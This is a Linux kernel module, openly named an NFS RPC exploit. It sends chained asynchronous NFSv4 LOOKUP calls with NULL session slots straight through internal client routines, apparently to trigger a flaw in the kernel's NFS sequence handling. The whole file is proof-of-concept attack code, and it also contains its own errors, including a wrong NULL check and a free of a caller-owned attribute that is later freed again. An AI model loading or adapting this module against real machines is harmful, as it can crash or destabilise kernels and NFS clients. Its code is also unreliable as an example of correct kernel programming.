#include <linux/module.h>
#include <linux/init.h>

#include "sequence_lookups_exploit.h"

//#include <linux/jiffies.h>
MODULE_LICENSE("GPL");

static void init_sequence(struct nfs4_sequence_args *args,
                struct nfs4_sequence_res *res, int cache_reply)
{
	args->sa_slot = NULL;
	args->sa_cache_this = cache_reply;
	args->sa_privileged = 0;

	res->sr_slot = NULL;
}

int alloc_sequecne_lookups_data(struct nfs_fattr **fattr, struct nfs4_label **label,
			struct nfs_fh **fh1, struct nfs_fh **fh2, struct nfs_server *server)
{
	for (int i = 0; i < 4; ++i) {
		label[i] = nfs4_label_alloc(server, GFP_KERNEL);
		fattr[i] = nfs_alloc_fattr();
		if(!fattr[i])
			return -ENOMEM;
	}
	*fh1 = nfs_alloc_fhandle();
	*fh2 = nfs_alloc_fhandle();
	if(!fh1 || !fh2)
		return -ENOMEM;
	return 0;
}

void free_sequence_lookups_data(struct nfs_fattr **fattr, struct nfs4_label **label,
				struct nfs_fh *fh1, struct nfs_fh *fh2)
{
	for (int i = 0; i < 4; ++i) {
		nfs4_label_free(label[i]);
		nfs_free_fattr(fattr[i]);
	}
	nfs_free_fhandle(fh1);
	nfs_free_fhandle(fh2);
}

static int my_nfs4_proc_lookup(struct nfs_fh *dir_fh, struct nfs_server *server,
                const struct qstr *name, struct nfs_fh *fhandle,
                struct nfs_fattr *fattr, struct nfs4_label *label)
{

	struct nfs4_lookup_res res = {};
	struct nfs4_lookup_arg args = {};
	struct rpc_message msg = {};
	struct rpc_task *task;
	struct rpc_task_setup task_setup_data = {};
	struct nfs4_call_sync_data data = {};
	struct rpc_procinfo *procedures;
	int status;

	args.dir_fh = dir_fh;
	args.bitmask = server->attr_bitmask;
	args.name = name;

	res.server = server;
	res.fattr = fattr;
	res.fh = fhandle;
	res.label = label;


	if(!(procedures = server->nfs_client->cl_rpcclient->cl_procinfo)){
		printk("no procedures\n");
		return -1;
	}

	msg.rpc_proc = &procedures[NFSPROC4_CLNT_LOOKUP];
	msg.rpc_argp = &args;
	msg.rpc_resp = &res;
	msg.rpc_cred = rpc_lookup_cred();
	
	data.seq_server = server;
	data.seq_args = &args.seq_args;
	data.seq_res = &res.seq_res;

	
	task_setup_data.rpc_client = server->client;
	task_setup_data.rpc_message = &msg;
	task_setup_data.callback_ops = server->nfs_client->cl_mvops->call_sync_ops;
	task_setup_data.callback_data = &data;
	task_setup_data.workqueue = nfsiod_workqueue;
	task_setup_data.flags = RPC_TASK_ASYNC;

	nfs_fattr_init(fattr);
	init_sequence(&args.seq_args, &res.seq_res, 0);

	task = rpc_run_task(&task_setup_data);

	if (IS_ERR(task)){
		printk("bad task\n");
		kfree(res.fattr);
		return PTR_ERR(task);
	}
	status = rpc_wait_for_completion_task(task);
	rpc_put_task(task);
	return status;
}

static int __init nfs_rpc_exploit_init(void)
{
	//it has to exist, because from this file we get nfs server
	char directory_name[] = "/mnt/temp_dir";
	// /mnt/temp_dir/foo/bar/dir/folder has to exist
	char *subdir_name[] = {"foo", "bar", "dir", "folder"};
	int subdir_name_len[4];

	int err;

	struct path path;
	struct nfs_fattr  *fattr[4];
	struct nfs4_label *label[4];
	struct nfs_server *server;
	struct nfs_fh *dir_fh, *subdir_fh;

	err = kern_path(directory_name, LOOKUP_FOLLOW, &path);
	if (err) {
		printk("file didn't found\n");
		return err; 
	}

	server = NFS_SERVER((path.dentry)->d_inode);

	if (alloc_sequecne_lookups_data(fattr, label, &dir_fh, &subdir_fh, server)) {
		printk("Memory expired\n");
		free_sequence_lookups_data(fattr, label, dir_fh, subdir_fh);
		return -ENOMEM;
	}

	nfs_copy_fh(dir_fh, NFS_FH((path.dentry)->d_inode));
	for (int i = 0; i < 4; ++i)
		subdir_name_len[i] = strlen(subdir_name[i]);
	
	//my delay
	//set_current_state(TASK_INTERRUPTIBLE);
	//schedule_timeout(msecs_to_jiffies(5000));

	for (int i =0; i < 4; ++i) {
		struct qstr q_subdir_name = QSTR_INIT(subdir_name[i],subdir_name_len[i]);
		my_nfs4_proc_lookup(dir_fh, server, &q_subdir_name, 
					subdir_fh, fattr[i], label[i]);
		nfs_copy_fh(dir_fh, subdir_fh);
	}

	free_sequence_lookups_data(fattr, label, dir_fh, subdir_fh);
	return 0;
}

static void __exit nfs_rpc_exploit_exit(void)
{
}

module_init(nfs_rpc_exploit_init);
module_exit(nfs_rpc_exploit_exit);